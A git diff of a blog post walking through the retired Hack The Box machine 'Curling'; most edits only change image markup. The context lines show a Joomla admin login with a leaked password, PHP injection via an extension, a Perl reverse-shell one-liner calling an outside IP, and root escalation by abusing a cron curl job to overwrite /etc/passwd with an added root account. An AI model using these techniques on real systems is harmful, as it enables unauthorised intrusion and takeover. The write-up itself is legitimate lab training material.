@@ -17,10 +17,10 @@ This post documents the complete walkthrough of Curling, a retired vulnerable [V
 
 <!--more-->
 
-## On this post 
-{:.no_toc} 
+## On this post
+{:.no_toc}
 
-* TOC 
+* TOC
 {:toc}
 
 ## Background
@@ -49,9 +49,9 @@ PORT   STATE SERVICE REASON         VERSION
 
 Let's start with the `http` service. This is how it looks like in a browser.
 
-<a class="image-popup">
-![8551cc0f.png](/assets/images/posts/curling-htb-walkthrough/8551cc0f.png)
-</a>
+
+{% include image.html image_alt="8551cc0f.png" image_src="/6f0ded74-c9e8-4b28-b32d-18ee3f9e961d/8551cc0f.png" %}
+
 
 ### Directory/File Enumeration
 
@@ -90,9 +90,9 @@ Requests/sec.: 48.95982
 
 Now, what do we have here? Joomla!
 
-<a class="image-popup">
-![12613c27.png](/assets/images/posts/curling-htb-walkthrough/12613c27.png)
-</a>
+
+{% include image.html image_alt="12613c27.png" image_src="/6f0ded74-c9e8-4b28-b32d-18ee3f9e961d/12613c27.png" %}
+
 
 ### Joomla 3.8
 
@@ -100,27 +100,27 @@ If you look at the articles posted, the first article was signed off by Floris a
 
 Hidden at the bottom of the HTML source code of the landing page is a HTML comment that looks like this.
 
-<a class="image-popup">
-![6ec7edb7.png](/assets/images/posts/curling-htb-walkthrough/6ec7edb7.png)
-</a>
+
+{% include image.html image_alt="6ec7edb7.png" image_src="/6f0ded74-c9e8-4b28-b32d-18ee3f9e961d/6ec7edb7.png" %}
+
 
 Hmm. It seems to suggest the presence of a `secret.txt` file. Let's check it out.
 
-<a class="image-popup">
-![8ebdadd4.png](/assets/images/posts/curling-htb-walkthrough/8ebdadd4.png)
-</a>
+
+{% include image.html image_alt="8ebdadd4.png" image_src="/6f0ded74-c9e8-4b28-b32d-18ee3f9e961d/8ebdadd4.png" %}
+
 
 That's the `base64`-encoding of the string `Curling2018!`.
 
-<a class="image-popup">
-![a92bf554.png](/assets/images/posts/curling-htb-walkthrough/a92bf554.png)
-</a>
+
+{% include image.html image_alt="a92bf554.png" image_src="/6f0ded74-c9e8-4b28-b32d-18ee3f9e961d/a92bf554.png" %}
+
 
 Could this be the password? There's only one way to find out.
 
-<a class="image-popup">
-![40671766.png](/assets/images/posts/curling-htb-walkthrough/40671766.png)
-</a>
+
+{% include image.html image_alt="40671766.png" image_src="/6f0ded74-c9e8-4b28-b32d-18ee3f9e961d/40671766.png" %}
+
 
 The credential is indeed (`floris:Curling2018!`) and a Super User no less.
 
@@ -128,27 +128,27 @@ The credential is indeed (`floris:Curling2018!`) and a Super User no less.
 
 Searching for "writing joomla article in php" in Google led me to [Sourcerer](https://www.regularlabs.com/extensions/sourcerer), a Joomla extension that allows one to write in any code, more importantly in PHP. And since I'm the Super User, installing an extension is a breeze. Go to Extensions->Manage->Install.
 
-<a class="image-popup">
-![95c16f02.png](/assets/images/posts/curling-htb-walkthrough/95c16f02.png)
-</a>
+
+{% include image.html image_alt="95c16f02.png" image_src="/6f0ded74-c9e8-4b28-b32d-18ee3f9e961d/95c16f02.png" %}
+
 
 Upload the extension and you are done.
 
-<a class="image-popup">
-![d1fda8ec.png](/assets/images/posts/curling-htb-walkthrough/d1fda8ec.png)
-</a>
+
+{% include image.html image_alt="d1fda8ec.png" image_src="/6f0ded74-c9e8-4b28-b32d-18ee3f9e961d/d1fda8ec.png" %}
+
 
 Now, log in to the landing page with the same credential and go back to one of the articles already posted; and add some PHP code like this.
 
-<a class="image-popup">
-![b1c12ee0.png](/assets/images/posts/curling-htb-walkthrough/b1c12ee0.png)
-</a>
+
+{% include image.html image_alt="b1c12ee0.png" image_src="/6f0ded74-c9e8-4b28-b32d-18ee3f9e961d/b1c12ee0.png" %}
+
 
 Save the article and go to the article's canonical URL.
 
-<a class="image-popup">
-![0e4516a9.png](/assets/images/posts/curling-htb-walkthrough/0e4516a9.png)
-</a>
+
+{% include image.html image_alt="0e4516a9.png" image_src="/6f0ded74-c9e8-4b28-b32d-18ee3f9e961d/0e4516a9.png" %}
+
 
 Isn't this awesome? We are now ready for a reverse shell. I always like Perl because it's more likely to be present than Python.
 
@@ -160,55 +160,55 @@ perl -e 'use Socket;$i="10.10.14.109";$p=1234;socket(S,PF_INET,SOCK_STREAM,getpr
 
 Meanwhile at my `nc` listener, a reverse shell appears...
 
-<a class="image-popup">
-![255ebd1e.png](/assets/images/posts/curling-htb-walkthrough/255ebd1e.png)
-</a>
+
+{% include image.html image_alt="255ebd1e.png" image_src="/6f0ded74-c9e8-4b28-b32d-18ee3f9e961d/255ebd1e.png" %}
+
 
 ## Privilege Escalation
 
 During enumeration of `www-data`'s account, I notice an interesting file `password_backup` at `/home/floris`. The `user.txt` is here but only `floris` can read it.
 
-<a class="image-popup">
-![a6623416.png](/assets/images/posts/curling-htb-walkthrough/a6623416.png)
-</a>
+
+{% include image.html image_alt="a6623416.png" image_src="/6f0ded74-c9e8-4b28-b32d-18ee3f9e961d/a6623416.png" %}
+
 
 The file `password_backup` is a hexdump.
 
-<a class="image-popup">
-![f38ab22b.png](/assets/images/posts/curling-htb-walkthrough/f38ab22b.png)
-</a>
+
+{% include image.html image_alt="f38ab22b.png" image_src="/6f0ded74-c9e8-4b28-b32d-18ee3f9e961d/f38ab22b.png" %}
+
 
 Let's restore the hexdump back to its binary form and see what's next with `file`.
 
-<a class="image-popup">
-![4aae9715.png](/assets/images/posts/curling-htb-walkthrough/4aae9715.png)
-</a>
+
+{% include image.html image_alt="4aae9715.png" image_src="/6f0ded74-c9e8-4b28-b32d-18ee3f9e961d/4aae9715.png" %}
+
 
 Let's try the credential (`floris:5d<wdCbdZu)|hChXll`) with SSH.
 
-<a class="image-popup">
-![1fca6a37.png](/assets/images/posts/curling-htb-walkthrough/1fca6a37.png)
-</a>
+
+{% include image.html image_alt="1fca6a37.png" image_src="/6f0ded74-c9e8-4b28-b32d-18ee3f9e961d/1fca6a37.png" %}
+
 
 Perfect. Time to retrieve `user.txt`.
 
-<a class="image-popup">
-![31cbe022.png](/assets/images/posts/curling-htb-walkthrough/31cbe022.png)
-</a>
+
+{% include image.html image_alt="31cbe022.png" image_src="/6f0ded74-c9e8-4b28-b32d-18ee3f9e961d/31cbe022.png" %}
+
 
 Now, I notice something really strange going on in `/admin-area`.
 
-<a class="image-popup">
-![3a223cec.png](/assets/images/posts/curling-htb-walkthrough/3a223cec.png)
-</a>
+
+{% include image.html image_alt="3a223cec.png" image_src="/6f0ded74-c9e8-4b28-b32d-18ee3f9e961d/3a223cec.png" %}
+
 
 Two files are written here by `root` at every minute interval! If I have to guess, I would say that a `cron` job is ran by `root` every minute writing the files here.
 
 The file `input` contains `curl`-like argument like this.
 
-<a class="image-popup">
-![7a809141.png](/assets/images/posts/curling-htb-walkthrough/7a809141.png)
-</a>
+
+{% include image.html image_alt="7a809141.png" image_src="/6f0ded74-c9e8-4b28-b32d-18ee3f9e961d/7a809141.png" %}
+
 
 If that's the case, I can change the content to this.
 
@@ -219,23 +219,23 @@ output = "/etc/passwd"
 
 This input will tell `curl` to download the file at `/tmp/passwd` and write it to `/etc/passwd`. Now, let's copy `/etc/passwd` to `/tmp/passwd` and add another `root` account like so.
 
-<a class="image-popup">
-![1a567305.png](/assets/images/posts/curling-htb-walkthrough/1a567305.png)
-</a>
+
+{% include image.html image_alt="1a567305.png" image_src="/6f0ded74-c9e8-4b28-b32d-18ee3f9e961d/1a567305.png" %}
+
 
 Where `to5bce5sr7eK6` is the `crypt(3)` hash or one-way digest of "toor" with salt "toor".
 
 Once that's done, we can proceed to modify `input` and log in as `toor` a minute later.
 
-<a class="image-popup">
-![f2bb1de7.png](/assets/images/posts/curling-htb-walkthrough/f2bb1de7.png)
-</a>
+
+{% include image.html image_alt="f2bb1de7.png" image_src="/6f0ded74-c9e8-4b28-b32d-18ee3f9e961d/f2bb1de7.png" %}
+
 
 Getting `root.txt` is next to trivial.
 
-<a class="image-popup">
-![320937c1.png](/assets/images/posts/curling-htb-walkthrough/320937c1.png)
-</a>
+
+{% include image.html image_alt="320937c1.png" image_src="/6f0ded74-c9e8-4b28-b32d-18ee3f9e961d/320937c1.png" %}
+
 
 :dancer:
 
